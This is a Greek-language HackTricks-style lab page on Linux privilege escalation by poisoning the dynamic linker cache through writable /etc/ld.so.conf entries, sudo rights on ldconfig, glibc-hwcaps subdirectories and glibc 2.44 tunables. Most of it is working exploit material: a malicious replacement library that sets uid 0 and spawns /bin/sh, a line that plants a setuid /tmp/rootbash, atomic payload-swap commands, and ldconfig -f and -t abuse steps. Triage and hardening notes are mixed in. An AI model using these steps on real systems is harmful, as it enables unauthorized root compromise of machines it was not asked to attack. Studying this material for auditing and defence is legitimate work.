# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα είναι ένα στοχευμένο lab για poisoning του **system linker cache μέσω των `/etc/ld.so.conf` ή `ldconfig`**. Για missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` και άλλα generic SUID linker abuse, δείτε το [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Προετοιμασία του περιβάλλοντος

Στην παρακάτω ενότητα θα βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για την προετοιμασία του περιβάλλοντος.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιουργήστε** αυτά τα αρχεία στο μηχάνημά σας, στον ίδιο φάκελο
2. **Κάντε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντιγράψτε** το `libcustom.so` στο `/usr/lib` και ανανεώστε την cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάντε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ελέγξτε το περιβάλλον

Ελέγξτε ότι το _libcustom.so_ **φορτώνεται** από το _/usr/lib_ και ότι μπορείτε να **εκτελέσετε** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Κατά την επίθεση σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary, τι **επιλύει αυτήν τη στιγμή ο loader** και ποιες ρυθμισμένες διαδρομές είναι εγγράψιμες χωρίς να τροποποιήσετε το live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Χρησιμοποιήστε το `ldd` μόνο σε ένα **trusted** executable. Ορισμένες υλοποιήσεις ή ασυνήθιστοι ELF interpreters μπορεί να προκαλέσουν την εκτέλεση code που ελέγχεται από attacker· το `objdump -p ./file | grep NEEDED` εμφανίζει με ασφάλεια τις direct dependencies. Για ένα trusted target, η εκτέλεση του interpreter που εντοπίστηκε με `--list` εμφανίζει την πραγματική resolution. Συγκρίνετε αυτό το output με το `--inhibit-cache --list`: μια διαφορά αποδεικνύει ότι το `/etc/ld.so.cache`, και όχι ένας συνηθισμένος κανόνας search-path, επέλεξε το object.<sup>[[1]](#references)[[4]](#references)</sup>

Μερικά χρήσιμα gotchas:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η redirection εκτελείται από το τρέχον shell. Χρησιμοποιήστε
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` αντί γι' αυτό.
- Τα **SUID/privileged** binaries εκτελούνται σε **secure-execution mode**: το `LD_LIBRARY_PATH`
αγνοείται, ενώ το `LD_PRELOAD` είναι περιορισμένο (ονόματα που περιέχουν slash
αγνοούνται και μπορούν να γίνουν preload μόνο libraries με setuid-marked σε standard directories). Μόλις το root εκτελέσει το `ldconfig`, οι directories που αναφέρονται στο
`/etc/ld.so.conf` μπορούν να εισαχθούν στο `/etc/ld.so.cache`, επομένως αυτή η misconfiguration μπορεί
να επηρεάσει και privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- Το `LD_DEBUG` επίσης αγνοείται σε secure-execution mode, εκτός αν υπάρχει το `/etc/suid-debug`, επομένως συλλέξτε το trace από ένα αντίστοιχο non-SUID run αντί να περιμένετε output από την privileged execution.<sup>[[1]](#references)</sup>
- Στα glibc 2.33 και νεότερα, ο dynamic loader παρέχει επίσης το
`--list-diagnostics`, το οποίο εμφανίζει machine-readable loader diagnostics και πληροφορίες για τα built-in search paths όταν ένα hijack δεν συμπεριφέρεται όπως αναμένεται.<sup>[[1]](#references)[[6]](#references)</sup>

### Περιορισμοί Cache και SONAME

Το `ldconfig` δεν κάνει cache κάθε arbitrary file σε ένα configured directory: εξετάζει ELF headers, αναγνωρίζει ονόματα που ταιριάζουν με `lib*.so*` ή `ld-*.so*` και αναμένει την τυπική ακολουθία `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Επομένως, το injected object πρέπει να έχει την architecture/class του target, το ακριβές όνομα `DT_NEEDED` (κανονικά το `DT_SONAME`) και όλα τα symbols/versions που κάνει resolve το victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Προτιμήστε μια βιβλιοθήκη ειδικά για τον target, όπως σε αυτό το παράδειγμα. Το shadowing ενός κοινού SONAME με ένα incomplete object μπορεί να προκαλέσει failure σε κάθε process που το κάνει resolve πριν εκτελεστεί ο intended privileged target.<sup>[[3]](#references)</sup>

### Persistence cached paths και atomic swaps

Το cache καταγράφει μια αντιστοίχιση **ονόματος library σε pathname**· δεν ενσωματώνει το shared object. Αφού αποθηκευτεί στο cache ένα pathname που ελέγχεται από attacker, η αντικατάσταση του object στο συγκεκριμένο path επηρεάζει τα processes που ξεκινούν στη συνέχεια, χωρίς νέο run του `ldconfig`. Αυτό επιτρέπει ένα χρήσιμο time-of-check/time-of-use pattern: εκθέστε μια valid library κατά το cache rebuild ή inspection από administrator και, στη συνέχεια, κάντε atomic rename του payload πάνω από αυτήν. Τα υπάρχοντα processes διατηρούν το object που έχουν ήδη κάνει map.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Παρομοίως, η διαγραφή της κακόβουλης γραμμής από το `ld.so.conf` δεν απομακρύνει από μόνη της μια ήδη εγγεγραμμένη καταχώριση: ο διαχειριστής πρέπει να αφαιρέσει το μη αξιόπιστο αντικείμενο, να διορθώσει την ιδιοκτησία/πρόσβαση εγγραφής και να αναδημιουργήσει την cache. Χρησιμοποιήστε τη σύγκριση με το `--inhibit-cache` παραπάνω για να διακρίνετε μια παρωχημένη καταχώριση cache από μια ακόμη ενεργή διαδρομή διαμόρφωσης.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Σε αυτό το σενάριο, υποθέστε ότι ένας διαχειριστής έχει προσθέσει μια ευάλωτη καταχώριση σε ένα
αρχείο κάτω από το `/etc/ld.so.conf.d/`, το οποίο περιλαμβάνεται από το
`/etc/ld.so.conf` του συστήματος.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι ο _/home/ubuntu/lib_ (όπου έχουμε πρόσβαση εγγραφής).\
**Κατεβάστε και κάντε compile** τον παρακάτω κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν αναμένετε ότι το **root** (ή κάποιος άλλος προνομιούχος λογαριασμός) θα εκτελέσει αργότερα το ευάλωτο binary, συνήθως είναι προτιμότερο να αφήσετε ένα **root-owned artifact** αντί να εκκινήσετε ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Στη συνέχεια, αφού πραγματοποιηθεί η εκτέλεση με elevated privileges, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious βιβλιοθήκη libcustom μέσα στη λανθασμένα ρυθμισμένη** διαδρομή, το default cache πρέπει να αναδημιουργηθεί μέσω μιας επιτυχούς εκτέλεσης του **`ldconfig`** με elevated privileges. Η επανεκκίνηση βοηθά μόνο όταν η τοπική διαδικασία εκκίνησης την εκτελεί πράγματι· διαφορετικά, περιμένετε ενέργεια από administrator ή χρησιμοποιήστε έναν unsafe κανόνα sudo, αν υπάρχει.<sup>[[2]](#references)</sup>

Μόλις συμβεί αυτό, **ελέγξτε ξανά** από πού φορτώνει το executable `sharedvuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, το **φορτώνει από το `/home/ubuntu/lib`** και αν το εκτελέσει οποιοσδήποτε χρήστης, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κλιμακώσει προνόμια, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή άλλον χρήστη με προνόμια να εκτελέσει το ευάλωτο binary**, θα μπορέσουμε να κλιμακώσουμε προνόμια.

### Σύγχρονο `glibc-hwcaps` shadowing

Από την glibc 2.33, ο loader μπορεί να προτιμά βελτιστοποιημένες βιβλιοθήκες μέσα στο `glibc-hwcaps/<level>/`, σε **κάθε directory αναζήτησης βιβλιοθηκών**. Συνεπώς, ο έλεγχος μόνο του `/home/ubuntu/lib` δεν επαρκεί: ένας εγγράψιμος συμβατός υποκατάλογος, όπως ο `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, μπορεί να κάνει shadow τη βασική βιβλιοθήκη αφού το `ldconfig` τον καταχωρίσει στο index, ενώ άλλες CPUs συνεχίζουν να χρησιμοποιούν το base object. Αυτό παρέχει επίσης ένα architecture-selective hijack που μπορεί να παραβλεφθεί όταν η επικύρωση πραγματοποιείται σε διαφορετική CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Οι τρέχουσες οδηγίες hardening του glibc συνιστούν την αποφυγή διπλότυπων SONAMEs, μη προεπιλεγμένων τοποθεσιών αναζήτησης και objects σε υποκαταλόγους `glibc-hwcaps`. Από την οπτική του audit, εφαρμόστε αναδρομικά ελέγχους ownership και writeability στους ρυθμισμένους καταλόγους και στα parent path components τους.<sup>[[3]](#references)</sup>

### Άλλες misconfigurations - Same vuln

Στο προηγούμενο παράδειγμα προσποιηθήκαμε μια misconfiguration, όπου ένας administrator **όρισε έναν non-privileged φάκελο μέσα σε ένα configuration file στο `/etc/ld.so.conf.d/`**.\
Υπάρχουν όμως και άλλες misconfigurations που μπορούν να προκαλέσουν την ίδια vulnerability: αν έχετε **write permissions** σε ένα φορτωμένο **config file**, μπορείτε να δημιουργήσετε ένα file σε έναν writable κατάλογο `/etc/ld.so.conf.d/` ή μπορείτε να γράψετε στο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε και να εκμεταλλευτείτε την ίδια vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges για το `ldconfig`**. Το `ldconfig` δέχεται scan directories ως positional arguments, επομένως η συντομότερη μορφή cache-poisoning είναι συχνά απλώς:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Εναλλακτικά, το `-f` επιλέγει ένα άλλο αρχείο διαμόρφωσης, διατηρώντας παράλληλα την προεπιλεγμένη έξοδο cache. Αυτό είναι χρήσιμο όταν ένα φίλτρο ορισμάτων αποκλείει καταλόγους που δίνονται ως positional arguments, αλλά εξακολουθεί να επιτρέπει το `-f`, ή όταν πρέπει να γίνει inject σε πολλές διαδρομές:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **προηγούμενο exploit**, **δημιουργήστε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig` μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.** Οι λεπτομέρειες των options έχουν σημασία κατά την αξιολόγηση ενός περιορισμένου sudo rule: το `-f` επιλέγει άλλο configuration, αλλά εξακολουθεί να ανακατασκευάζει το `/etc/ld.so.cache`· το `-C` ανακατευθύνει το cache αλλού· το `-N` αποτρέπει την ανακατασκευή του cache· και το `-X` αποτρέπει τις ενημερώσεις των links, αλλά **εξακολουθεί να ανακατασκευάζει το cache, εκτός αν συνδυαστεί με το `-N`**. Το `-n` συνεπάγεται `-N`, επομένως μπορεί να ενημερώνει links στους παρεχόμενους καταλόγους, αλλά δεν μπορεί να δηλητηριάσει το cache· το `-r` λειτουργεί κάτω από ένα alternate root και κανονικά δεν αλλάζει το cache του host.<sup>[[2]](#references)</sup>

## glibc 2.44: cached system-wide tunables

Ξεκινώντας από τη glibc 2.44, το `ldconfig` αναλύει επίσης το `/etc/tunables.conf` και αποθηκεύει τις ρυθμίσεις του ως extension στο `/etc/ld.so.cache`. Το αρχείο δέχεται directives `include` και per-process filters. Τα prefixes ελέγχουν το scope: το `@` στοχεύει μόνο processes με `AT_SECURE`, το `$` τα εξαιρεί και το `*` καλύπτει και τα δύο. Αυτό διευρύνει το audit boundary πέρα από τους library directories: ένα writable tunables configuration ή ένα included file μπορεί να επηρεάσει μελλοντικά program startups μετά από privileged cache rebuild.<sup>[[7]](#references)</sup>

Η ίδια release προσθέτει το `ldconfig -t TUNCONF`, το οποίο επιλέγει ένα alternate tunables file, ενώ εξακολουθεί να γράφει στο κανονικό cache, εκτός αν κάποια άλλη option το αλλάξει. Επομένως, wrappers και sudo rules που προσπάθησαν να αποκλείσουν μόνο το `-f` πρέπει επίσης να απορρίπτουν το `-t`, arbitrary positional directories και cache-output manipulation.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Αυτό δεν αποτελεί αυτόματη arbitrary code execution. Είναι ένα privileged **loader-behavior manipulation** primitive: το glibc προειδοποιεί ρητά ότι οι system-wide τιμές μπορούν να εφαρμόσουν security-sensitive tunables σε προγράμματα setuid/setgid χωρίς security screening ανά tunable. Κάντε enumerate τα πραγματικά tunables του host με το `--list-tunables` και αναζητήστε target-specific αλλαγές στον allocator, CPU-hardening αλλαγές ή συνθήκες denial-of-service, αντί να υποθέτετε ένα universal payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening του Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Διαγνωστικά του Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Προσθήκη system-wide tunables: τμήμα ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
